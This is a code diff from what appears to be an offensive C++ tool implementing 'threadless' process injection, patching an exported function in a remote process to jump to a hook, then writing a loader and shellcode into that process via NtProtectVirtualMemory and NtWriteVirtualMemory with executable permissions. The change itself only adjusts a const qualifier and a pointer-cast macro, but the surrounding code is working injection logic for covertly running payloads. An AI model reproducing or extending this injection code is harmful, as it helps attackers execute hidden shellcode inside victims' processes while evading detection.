@@ -63,7 +63,7 @@ namespace Injection {
             return;
         }
 
-        const auto LoaderRva = pHook - (pExport + 5);
+        auto LoaderRva = pHook - (pExport + 5);
         const auto hookCpy = pHook;
 
         MmPatchData(i, B_PTR(&exportCpy), (i), B_PTR(&pExport), (i), sizeof(LPVOID))
@@ -71,7 +71,7 @@ namespace Injection {
         MmPatchData(i, Threadless.Opcode.Buffer, (0x01 + i), B_PTR(&LoaderRva), (i), 4)
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CP_PTR(&exportCpy), &cbShellcode, PAGE_EXECUTE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&exportCpy), &cbShellcode, PAGE_EXECUTE_READWRITE, &Protect)) ||
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pExport), C_PTR(Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write))
             || Write != Threadless.Opcode.Length) {
             return;
@@ -80,7 +80,7 @@ namespace Injection {
         cbShellcode = Threadless.Loader.Length + Rsrc->Size;
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CP_PTR(&hookCpy), &cbShellcode, PAGE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&hookCpy), &cbShellcode, PAGE_READWRITE, &Protect)) ||
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
             Write != Threadless.Loader.Length) {
             return;
@@ -90,7 +90,7 @@ namespace Injection {
 
         if (
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, Rsrc->Size, &Write)) || Write != Rsrc->Size ||
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CP_PTR(&pHook), &cbShellcode, Protect, &Protect))) {
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&pHook), &cbShellcode, Protect, &Protect))) {
             return;
         }
 
